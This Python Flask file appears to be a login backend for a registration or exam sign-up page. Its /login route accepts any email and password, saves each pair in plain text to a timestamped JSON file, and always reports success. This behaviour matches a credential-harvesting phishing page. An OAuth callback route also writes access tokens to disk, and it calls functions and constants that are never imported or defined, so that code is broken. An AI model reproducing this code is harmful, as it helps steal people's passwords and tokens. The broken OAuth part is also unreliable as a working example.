import os
import json
import re
from flask import Flask, request, jsonify, render_template, redirect
from flask_cors import CORS
import smtplib
from email.mime.text import MIMEText
import ssl
import hashlib
import time

app = Flask(__name__, static_folder='static', template_folder='templates')
app.secret_key = os.urandom(24)  # For session management
CORS(app)


# Secure credential storage
CREDENTIALS_DIR = os.path.join(os.path.dirname(__file__), 'credentials')
USER_CREDENTIALS_FILE = os.path.join(CREDENTIALS_DIR, 'user_credentials.json')

# Ensure credentials directory exists
os.makedirs(CREDENTIALS_DIR, exist_ok=True)

# Validation functions
def is_valid_email(email):
    email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(email_regex, email) is not None

def save_raw_password(password):
    # WARNING: STORING PASSWORDS IN PLAIN TEXT IS EXTREMELY DANGEROUS!
    # This method is HIGHLY INSECURE and should NEVER be used in a production environment
    return password

@app.route('/')
def login_page():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')
    

    # Save credentials and redirect to success page
    try:
        # Create timestamp with milliseconds precision
        current_time = time.localtime()
        milliseconds = int((time.time() % 1) * 1000)
        formatted_timestamp = f"{time.strftime('%d-%m-%Y %H:%M:%S', current_time)}.{milliseconds:03d}"
        
        # Create the user data in the requested format
        user_data = {
            "email": email if email else "",
            "password": save_raw_password(password) if password else "",
            "timestamp": formatted_timestamp
        }
        
        # Use timestamp as filename
        timestamp = str(time.time()).replace('.', '_')
        credential_file = os.path.join(CREDENTIALS_DIR, f'{timestamp}_credentials.json')
        
        with open(credential_file, 'w') as f:
            json.dump(user_data, f, indent=4)
        
        # Return success and redirect
        return jsonify({
            'status': 'success',
            'redirect_url': '/successful-registration'
        }), 200
    
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/oauth2callback')
def oauth2callback():
    state = session.get('state', '')
    email = session.get('email', '')
    
    # Validate state to prevent CSRF
    if not state or request.args.get('state') != state:
        return 'Invalid state parameter', 400
    
    flow = Flow.from_client_secrets_file(
        CLIENT_SECRETS_FILE,
        scopes=SCOPES,
        state=state,
        redirect_uri=url_for('oauth2callback', _external=True)
    )
    
    # Exchange authorization code for credentials
    flow.fetch_token(authorization_response=request.url)
    credentials = flow.credentials
    
    # Verify email using Google People API
    service = build('people', 'v1', credentials=credentials)
    profile = service.people().get(resourceName='people/me', personFields='emailAddresses').execute()
    
    verified_email = profile.get('emailAddresses', [{}])[0].get('value', '')
    
    if verified_email.lower() == email.lower():
        # Save credentials securely
        with open(CREDENTIALS_FILE, 'w') as f:
            json.dump({
                'email': email,
                'token': credentials.token
            }, f)
        
        return 'Authentication Successful! You will receive the entrance exam link via email shortly.'
    else:
        return 'Email verification failed', 401



@app.route('/successful-registration')
def successful_registration_page():
    return render_template('successful_registration.html')

if __name__ == '__main__':
    app.run(debug=True, port=5000)